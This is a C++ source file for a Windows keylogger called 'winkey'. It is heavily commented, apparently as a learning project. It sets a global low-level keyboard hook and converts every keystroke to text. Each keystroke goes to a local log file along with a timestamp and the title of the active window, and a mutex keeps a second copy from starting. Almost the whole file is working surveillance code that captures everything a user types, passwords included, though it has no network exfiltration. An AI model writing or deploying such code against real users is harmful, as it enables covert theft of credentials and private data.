#include "winkey.hpp"

std::wofstream  logFile;
HWND            lastWindow = nullptr;
HANDLE          singleInstanceMutex = nullptr;
HHOOK           keyboardHook = nullptr;

// Write the datetime + current active window name to the log file
void LogForegroundWindow(void) {
    // Get a handle to the currently focused window
    HWND    hwnd = GetForegroundWindow();
    // Only log if the focused window has changed
    if (!hwnd || hwnd == lastWindow) return;
    lastWindow = hwnd;

    // We use wide characters (wchar_t) + Unicode (W) version of the function
    wchar_t windowTitle[256];
    GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(wchar_t));

    time_t      now = time(nullptr);
    // Converts time_t into a tm structure representing the local time
    //  (hours, minutes, day, month, etc.)
    struct tm   localTime {};
    if (localtime_s(&localTime, &now)) return;

    // Add log to the logfile `[date time] - 'WINDOW_TITLE'`
    // `L` is for wide characters (Unicode)
    logFile << std::endl; // Force new line before the entry
    logFile << L"[" << std::setfill(L'0')
            << std::setw(2) << localTime.tm_mday << L"."
            << std::setw(2) << (localTime.tm_mon + 1) << L"."
            << (localTime.tm_year + 1900) << L" "
            << std::setw(2) << localTime.tm_hour << L":"
            << std::setw(2) << localTime.tm_min << L":"
            << std::setw(2) << localTime.tm_sec << L"] - '"
            << windowTitle << L"'" << std::endl;
}

/*
 * Low-level keyboard hook callback.
 *
 * @param   nCode   Code the system passes to the hook procedure to indicate
 *                  the action to be taken.
 * @param   wParam  The message type.
 * @param   lParam  Points to a KBDLLHOOKSTRUCT structure that contains detailed
 *                  information about the keyboard event (which key, scan code,
 *                  flags, etc.).
 * 
 * @return  CallNextHookEx
 *          - LRESULT is a Windows data type used for return values from
 *              window procedures and hook functions.
 *          - CALLBACK is a macro defining the calling convention of the function
 *              (specifies how parameters are passed and who cleans the stack).
 */
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    /*
     * HC_ACTION        Process the event normally.
     * WM_KEYDOWN       Key pressed
     * WM_SYSKEYDOWN    System key pressed (like ALT)
     */
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT*    p = (KBDLLHOOKSTRUCT*)lParam;
        BYTE                keyboardState[256];
        WCHAR               buffer[5] = {};

        // Get the current state of all keys
        GetKeyboardState(keyboardState);
        // Gets the input language layout of the current thread
        HKL layout = GetKeyboardLayout(0);
        
        /*
         * Converts the virtual key code (vkCode) and scan code into the
         *  corresponding Unicode character(s)
         * 
         * vkCode:
         *  - A Windows-defined constant that identifies a logical key,
         *      like "A", "Shift", "Enter", "F1", etc.
         *  - Same across keyboards: for example, VK_A always refers to the A key,
         *      no matter where it is on the keyboard.
         * 
         * scanCode:
         *  - A hardware-generated code from the keyboard itself.
         *  - Represents the physical location of the key on the keyboard.
         */

        int result = ToUnicodeEx(
            p->vkCode, p->scanCode, keyboardState, buffer, 4, 0, layout
        );
        buffer[result] = L'\0'; // Null-terminate

        LogForegroundWindow();  // Check and log if new window

        /* Log character to file or, if no valid character was produced
         *  (like arrow keys, function keys), log a fallback string that includes
         *  the virtual key code.
         */
        if (result > 0) logFile << buffer;
        else logFile << L"[VK_" << p->vkCode << L"]";

        // Ensure that everything written to the file is immediately pushed to disk
        logFile.flush();
    }

    // Pass the event to the next hook
    // (Otherwise, we will swallow the event and suppress it)
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(void) {
    // Prevent multiple instances of this program
    singleInstanceMutex = CreateMutex(NULL, TRUE, TEXT(TW_MUTEX_NAME));
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        std::cerr << "Already running" << std::endl;
        return 1;
    }

    // Open the outfile in appending mode
    logFile.open("winkey.log", std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file." << std::endl;
        return 1;
    }

    // Install global low-level keyboard hook to intercept keystrokes
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!keyboardHook) {
        std::cerr << "Failed to set keyboard hook." << std::endl;
        return 1;
    }

    // Standard message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

        // Check every 500ms
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }

    // Cleanup
    UnhookWindowsHookEx(keyboardHook);
    CloseHandle(singleInstanceMutex);
    logFile.close();

    return 0;
}
